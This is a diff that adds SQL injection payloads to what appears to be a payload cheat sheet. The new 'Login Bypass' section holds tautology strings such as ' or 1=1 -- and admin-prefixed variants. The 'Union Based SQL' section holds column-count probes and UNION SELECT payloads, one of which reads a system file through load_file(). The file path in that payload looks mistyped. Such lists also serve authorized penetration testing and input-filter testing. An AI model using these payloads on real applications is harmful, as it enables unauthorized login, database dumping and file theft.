@@ -91,6 +91,24 @@ Payloads
 	'))
 	"))
 
+Login Bypass
+
+	' or 1=1 --
+	' or '1'='1
+	' or 1=1 --+
+	admin' or 1=1;#
+	admin' or 1=1 LIMIT 1;#
+	admin' or 1=1 LIMIT 0,1;#
+
+Union Based SQL
+
+	order by 1
+	order by 2
+	order by 3
+	' UNION SELECT NULL --
+	' UNION SELECT NULL,NULL --
+	' UNION SELECT 1,2,3 -- -
+	' UNION SELECT 1,load_file('/etc/password'),3 --
 
 
 
